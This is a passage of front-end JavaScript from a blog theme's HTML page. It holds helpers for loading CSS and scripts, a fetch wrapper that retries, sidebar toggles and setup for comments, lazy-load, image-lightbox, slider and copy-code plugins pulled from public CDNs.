      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
